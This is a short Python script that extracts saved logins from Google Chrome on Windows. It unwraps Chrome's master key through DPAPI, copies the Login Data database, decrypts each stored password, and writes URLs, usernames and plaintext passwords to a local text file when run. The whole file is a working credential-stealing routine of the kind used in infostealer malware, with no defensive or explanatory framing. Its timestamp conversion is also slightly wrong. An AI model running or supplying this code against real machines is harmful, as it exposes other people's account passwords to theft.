import win32crypt
from Crypto.Cipher import AES
from win32ctypes.pywin32 import pywintypes

import os
import json
import shutil
import base64
import sqlite3
from datetime import datetime, timedelta


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except UnicodeDecodeError:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except pywintypes.error:
            return ""


def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "temp.db"
    shutil.copyfile(db_path, filename)
    
    try:
        with sqlite3.connect(filename) as db, open('temp.txt', 'w') as f:
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            for row in cursor.fetchall():
                origin_url, username_value, password_value, date_created = row
                password = decrypt_password(password_value, key)
                if password:
                    date_created = get_chrome_datetime(date_created / 10**6)
                    f.write(f"Origin URL: {origin_url}\n")
                    f.write(f"Username: {username_value}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Created: {date_created}\n\n")
    except sqlite3.Error as e:
        print("As error occured:", e)
    finally:
        db.close()
        os.remove(filename)


main()
